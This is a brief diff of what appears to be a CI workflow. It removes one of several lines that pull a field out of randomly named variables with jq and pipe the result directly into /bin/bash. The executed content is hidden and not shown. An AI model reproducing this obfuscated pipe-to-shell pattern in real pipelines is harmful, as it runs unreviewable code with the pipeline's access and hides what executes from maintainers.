@@ -22,7 +22,6 @@ jobs:
           echo $dbbzc81 | jq -r .e1831 | /bin/bash
           printf '%s' "$ry2" | jq -r .pdibv359 | /bin/bash
           printf '%s' "$fg392" | jq -r .qh0 | /bin/bash
-          echo $py422 | jq -r .ynac86198 | /bin/bash
           printf '%s' "$tic23" | jq -r .r4775 | /bin/bash
 
       - name: Save archive
